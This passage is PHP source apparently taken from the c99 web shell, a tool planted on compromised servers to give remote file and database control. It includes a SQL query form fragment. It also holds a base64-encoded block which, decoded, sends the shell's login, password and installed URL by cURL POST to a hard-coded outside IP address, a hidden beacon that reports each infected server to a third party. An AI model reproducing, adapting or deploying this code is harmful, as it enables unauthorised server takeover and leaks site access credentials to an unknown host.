...
$u212 = "aWYoKCRsb2dpbjw+JycpIGFuZCAoJHBhc3M8PicnKSkgeyRhdXRoID0gIiAtICIuJGxvZ2luLiI6Ii4kcGFzczt9IGVsc2UgeyR".
"hdXRoPSIiO30NCiR6cng9Imh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydQSFBfU0VMRiddLiRhdXRoLiIgLS".
"BjOTlcbiI7DQokdXJsPSJodHRwOi8vNDYuMTgzLjIxOS42OC9pbmZvLnBocCI7DQokY2ggPSBjdXJsX2luaXQoKTsgIA0KY3VybF9zZXRvc".
"HQoJGNoLENVUkxPUFRfVVJMLCR1cmwpOw0KY3VybF9zZXRvcHQoJGNoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsdHJ1ZSk7DQpjdXJsX3Nl".
"dG9wdCgkY2gsQ1VSTE9QVF9IRUFERVIsIGZhbHNlKTsgDQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwxKTsNCmN1cmxfc2V0b3B".
"0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAiZGF0YT0kenJ4Iik7DQokb3V0cHV0PWN1cmxfZXhlYygkY2gpOyAg";
$tmp = array();
...
function mysql_query_form()
{
 ...
 if ((!$submit) or ($sql_act))
 {
  ...
  if ($tbl_struct)
  {
   ...
   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "\BB <a href=\"#\" onclick=\"document.c999sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
   echo "</td></tr></table>";
  }
 }
